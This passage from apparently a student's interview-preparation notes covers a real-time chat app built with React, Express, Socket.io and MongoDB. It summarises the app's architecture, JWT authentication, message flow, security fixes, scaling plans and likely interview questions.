6. "How does your team approach the tradeoff between REST endpoints and WebSocket for operations that need both persistence and real-time broadcasting? In my project I used REST for data integrity (auth middleware, bcrypt) and Socket.io for the broadcast — curious if you've landed on a similar pattern."

7. "What's the deployment model for WebSocket servers — do you use sticky sessions at the load balancer layer, or have you moved to a stateless approach with something like the Socket.io Redis adapter?"

---

# 55. Final Revision Sheet

## Architecture in 30 seconds

React SPA on Vite dev server. Two communication channels: REST (Axios + JWT Bearer token) for auth and room CRUD, Socket.io WebSocket for real-time messages, presence, and typing. All data persisted in MongoDB Atlas via Mongoose. Three collections: users, rooms, messages.

## Authentication in 30 seconds

Register/login hit Express REST endpoints. Password hashed with bcrypt (cost 10). JWT signed with HS256 using JWT_SECRET from environment. Token stored in localStorage. Axios interceptor adds `Authorization: Bearer <token>` to every request. Server-side auth middleware reads the header, calls `jwt.verify()`, and sets `req.user`. 7-day expiry.

## Message flow in 30 seconds

User types → `socket.emit('chatMessage', {...})` → server validates → `new Message().save()` to MongoDB → `io.to(roomId).emit('message', saved_message)` → all room sockets receive it → React `setMessages(p => [...p, msg])` → MessageList re-renders with new bubble.

## Database in 30 seconds

Three collections: Users (username, email, bcrypt hash), Rooms (name, members[], isPrivate, bcrypt-hashed accessKey), Messages (room ref, sender ref, senderUsername denormalized, content, reactions[], timestamp). Compound index on messages `{ room: 1, timestamp: -1 }` for efficient history queries.

## Socket.io in 30 seconds

Socket.io server attaches to the raw http.Server. Client connects after login. `joinRoom` → `socket.join(roomId)` + load history + broadcast presence. `chatMessage` → save to MongoDB → `io.to(room).emit` to all. `typing` → `socket.to(room).emit` (excludes sender). `disconnect` → remove from `activeRoomUsers`, update presence.

## Security in 30 seconds

Passwords: bcrypt cost 10. Private room keys: bcrypt (our improvement). JWTs: require JWT_SECRET in env, no hardcoded fallback (our improvement). CORS: explicit allow-list, not wildcard (our improvement). Auth header: clean `Bearer <token>` (our improvement). Known gaps: localStorage for tokens, no rate limiting, no socket-level JWT verification.

## Scalability in 30 seconds

Current: single Node.js instance, in-memory presence (`activeRoomUsers`). Bottleneck: Socket.io rooms and presence are per-process. Fix: Multiple instances + load balancer with sticky sessions + Redis Socket.io adapter for cross-instance event broadcasting + Redis for shared presence state.

## Biggest project weakness

JWT stored in localStorage (XSS risk) + no rate limiting on login (brute force risk) + no socket authentication (any user can spoof another userId in socket events).

## Biggest improvement made

Private room access keys upgraded from plaintext comparison (`===`) to bcrypt hashing — prevents key exposure in a database breach. JWT hardcoded fallback removed — prevents silent use of a publicly-known secret.

## Strongest technical decision

Hybrid REST + Socket.io architecture. REST for auth and CRUD (middleware, error codes, caching-friendly, HTTP semantics). Socket.io for real-time events (push model, rooms, presence). Each used where it's strongest.

## One thing I would redesign

Store JWTs in HttpOnly Secure cookies and verify the token in the Socket.io handshake middleware — eliminates both the localStorage XSS risk and the socket authentication gap in one coordinated change.

## Most likely interviewer questions

1. Walk me through your project.
2. How exactly does a message travel from one browser to another?
3. What happens when a user logs in?
4. Where is the JWT generated and where is it stored?
5. What security improvements did you make?
6. Why MongoDB instead of PostgreSQL?
7. Why Socket.io instead of polling?
8. What would happen if two users send messages simultaneously?
9. How would you scale this to 100,000 users?
10. What are the weaknesses of your current implementation?
11. Did you build this yourself?
12. What would you improve?
